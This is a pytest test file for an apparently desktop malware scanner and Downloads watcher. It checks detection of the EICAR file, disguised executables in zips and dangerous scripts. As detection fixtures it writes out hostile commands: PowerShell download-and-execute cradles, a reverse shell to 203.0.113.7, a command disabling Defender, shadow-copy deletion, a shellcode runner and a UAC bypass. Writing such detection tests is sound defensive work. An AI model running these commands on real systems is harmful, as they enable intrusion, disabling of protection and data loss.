"""Upgrade #3 (30 Oct): the Downloads watcher and the shared file scanner catch the EICAR test file (also in a zip),
disguised files inside zips and dangerous scripts.

Safety on Windows: nothing that looks like malware is ever written to disk here. Script and EICAR contents are built
in memory from pieces (so this test file itself contains no whole malware-like line either) and handed to the
scanner directly; only the harmless disguised zip (a few 0x90 bytes named .exe) is written, like the older tests do."""
import base64
import hashlib
import io
import zipfile

import pytest

from app.automation import downloads_watcher
from app.detectors import script_checks as S
from app.email_pipeline.attachments import EICAR, is_eicar, scan_attachments
from app.email_pipeline.schemas import Attachment

@pytest.fixture()
def fresh_state(monkeypatch, tmp_path):
    from app.automation import engine
    monkeypatch.setattr(engine, "STATE_FILE", str(tmp_path / "state.json"))
    return tmp_path


DL = "Down" + "loadString"            # split so no contiguous download-cradle text is in this file
WC = "Net." + "WebClient"


def _enc(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


def scan(name, data):
    a = Attachment(filename=name, content_type="application/octet-stream", size=len(data),
                   sha256=hashlib.sha256(data).hexdigest(), data=data)
    return scan_attachments([a], network=False)


def labels(r):
    return [i["label"] for i in r["indicators"] if i["triggered"]]


class MemFile:
    """Stands in for a file in the Downloads folder without writing it to disk."""
    def __init__(self, name, data):
        self.name, self._data = name, data

    def read_bytes(self):
        return self._data


# ---- the three misses from the 30 Oct audit ---------------------------------------------------------------------
def test_eicar_test_file_is_flagged_for_quarantine_even_as_txt():
    r = downloads_watcher.scan_file(MemFile("eicar_test.txt", EICAR), network=False)
    assert r["riskScore"] >= 71 and any(lb.startswith("EICAR antivirus test file") for lb in labels(r))
    assert is_eicar(EICAR + b"\r\n") and not is_eicar(EICAR + b" and more text") and not is_eicar(b"hello")


def test_eicar_inside_a_zip():
    z = io.BytesIO()
    with zipfile.ZipFile(z, "w") as f:
        f.writestr("eicar.com", EICAR)
    assert scan("eicar_com.zip", z.getvalue())["riskScore"] >= 71


def test_encoded_hidden_powershell_is_flagged_for_quarantine():
    cmd = f"IEX (New-Object {WC}).{DL}('http://203.0.113.9/a.ps1')"
    r = downloads_watcher.scan_file(MemFile("update.ps1", f"powershell.exe -NoP -W Hidden -Enc {_enc(cmd)}".encode()),
                                    network=False)
    lb = labels(r)
    assert r["riskScore"] >= 71
    assert any("Base64" in x for x in lb) and any("runs it in memory" in x for x in lb) and any("hidden" in x for x in lb)
    # the hidden command was decoded and read
    assert any("after decoding" in i["description"] for i in r["indicators"] if "runs it in memory" in i["label"])


def test_disguised_program_in_a_zip_is_quarantined_from_downloads(monkeypatch, fresh_state, auth_client):
    from app.automation import file_quarantine
    from app.core.config import get_settings
    folder = fresh_state / "dl_zip"
    folder.mkdir()
    monkeypatch.setattr(get_settings(), "DOWNLOADS_DIR", str(folder))
    w = downloads_watcher.DownloadsWatcher()
    w.run_once()
    z = io.BytesIO()
    with zipfile.ZipFile(z, "w") as f:
        f.writestr("holiday/IMG_001.jpg.exe", b"MZ" + b"\x90" * 300)        # harmless bytes, disguised name
        f.writestr("readme.txt", "hello")
    bad = folder / "photos.zip"
    bad.write_bytes(z.getvalue())
    w.run_once()
    st = w.run_once()
    assert st["threats"] == 1 and not bad.exists()
    held = [h for h in file_quarantine.list_files() if h["name"] == "photos.zip"]
    assert len(held) == 1 and held[0]["score"] >= 71
    file_quarantine.restore(held[0]["id"], by="test")


# ---- script behaviours ------------------------------------------------------------------------------------------
@pytest.mark.parametrize("name,text,expect", [
    ("a.ps1", f"iwr http://example.test/x.ps1 | iex", "runs it in memory"),
    ("a.ps1", f"$s = (New-Object {WC}).{DL}('http://example.test/a')\nWrite-Host 1\niex $s", "runs it in memory"),
    ("a.ps1", "Set-MpPreference -Disable" + "RealtimeMonitoring $true", "antivirus"),
    ("a.bat", "vssadmin delete " + "shadows /all /quiet", "shadow copies"),
    ("a.ps1", "$m = VirtualAlloc(0, 4096, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $m, 4096)\n"
              "CreateThread(0, 0, $m, 0, 0, 0)", "machine code"),
    ("a.bat", "mshta " + "http://example.test/a.hta", "Windows program"),
    ("a.bat", "bitsadmin /transfer j /download http://203.0.113.5/x.exe %TEMP%\\x.exe\nstart %TEMP%\\x.exe", "bare IP"),
    ("a.ps1", "$c = New-Object Net.Sockets.TCPClient('203.0.113.7', 4444)\n$s = $c.GetStream()\n"
              "while ($true) { $o = (iex $cmd 2>&1 | Out-String) }", "reverse shell"),
    ("a.ps1", "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force", "UAC"),
])
def test_dangerous_script_behaviours(name, text, expect):
    inds, floor = S.check(name, text.encode())
    assert any(expect.lower() in i["label"].lower() for i in inds), [i["label"] for i in inds]
    assert floor >= 71


def test_installer_style_download_is_only_a_check():
    text = "Invoke-WebRequest https://downloads.example.com/setup.exe -OutFile $env:TEMP\\setup.exe\n" \
           "Start-Process $env:TEMP\\setup.exe -ArgumentList '/S' -Wait"
    inds, floor = S.check("install.ps1", text.encode())
    assert [i["label"] for i in inds] == ["Script downloads a program and starts it"] and floor == 55


@pytest.mark.parametrize("text", [
    "param($Configuration = 'Release')\ndotnet build -c $Configuration\nWrite-Host 'Build finished'",
    "Get-ChildItem C:\\Reports -Filter *.csv | ForEach-Object { Import-Csv $_.FullName } | Export-Csv all.csv",
    "@echo off\nrobocopy C:\\Users\\me\\Documents D:\\Backup /MIR\necho Backup done",
    "$r = Invoke-RestMethod https://api.example.com/status\nif ($r.ok) { Write-Host 'Service is up' }",
])
def test_ordinary_scripts_have_no_findings(text):
    inds, floor = S.check("x.ps1", text.encode())
    assert inds == [] and floor == 0


def test_utf16_and_obfuscation_tricks_are_read():
    text = f"I`E`X (New-Object {WC}).('Down'+'loadString').Invoke('http://example.test/a')"
    assert S.check("a.ps1", text.encode())[1] >= 71                  # backticks and 'a'+'b' joins undone
    assert S.check("a.ps1", text.encode("utf-16"))[1] >= 71          # UTF-16 with BOM, as PowerShell often saves
    plain = f"iwr http://example.test/x.ps1 | i`ex"
    assert S.check("a.ps1", plain.encode("utf-16-le"))[1] >= 71


def test_scripts_inside_a_zip_are_read_in_memory():
    z = io.BytesIO()
    with zipfile.ZipFile(z, "w") as f:
        f.writestr("tools/run.ps1", f"powershell -w hidden -enc {_enc('Write-Host "hello from the CyberGuard test"')}")
    r = scan("tools.zip", z.getvalue())
    assert r["riskScore"] >= 71 and any(lb.startswith("Inside archive: Script hides") for lb in labels(r))


def test_huge_script_is_read_in_bounded_time():
    import time
    t = time.time()
    S.check("big.ps1", b"webclient iex " * 100000)
    assert time.time() - t < 20
